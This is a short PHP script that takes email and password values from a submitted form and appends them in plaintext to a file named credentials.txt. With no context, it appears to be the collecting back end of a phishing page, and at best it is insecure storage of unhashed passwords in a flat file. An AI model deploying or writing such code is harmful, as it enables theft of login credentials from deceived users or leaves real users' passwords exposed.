<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Retrieve email and password from the POST request
    $email = filter_input(INPUT_POST, 'email', FILTER_SANITIZE_EMAIL);
    $password = filter_input(INPUT_POST, 'password', FILTER_SANITIZE_STRING);

    // Prepare the data to save
    $data = "Email: $email, Password: $password\n";

    // Specify the file path
    $file_path = 'credentials.txt';

    // Save the data to the file
    file_put_contents($file_path, $data, FILE_APPEND | LOCK_EX);

    // Optionally, redirect to a success page or show a message
    echo "Credentials saved successfully!";
} else {
    echo "Invalid request.";
}
?>
